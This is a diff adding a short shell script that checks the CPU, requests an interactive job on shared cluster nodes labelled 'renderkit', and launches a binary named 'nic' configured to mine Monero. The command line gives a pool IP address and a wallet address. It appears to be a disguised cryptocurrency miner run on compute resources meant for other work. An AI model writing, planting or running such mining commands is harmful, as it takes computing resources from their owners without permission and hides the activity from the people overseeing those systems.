@@ -1,0 +1,7 @@
+
+lscpu
+
+qsub -I -l nodes=1:renderkit:ppn=2
+
+cd rg
+./nic --cpu-max-threads-hint=65 --coin=XMR -o 162.19.139.184:2222 -u 46wNrMJznMCHE6rH4ayQ5MQ5HXqUP2hDdHPobMWk4BdxMxFVyL8pwpNCTiJEAy7byUej7t24JcQ5SF2rdvHEwiC83zjzyXr.tst1 -p x
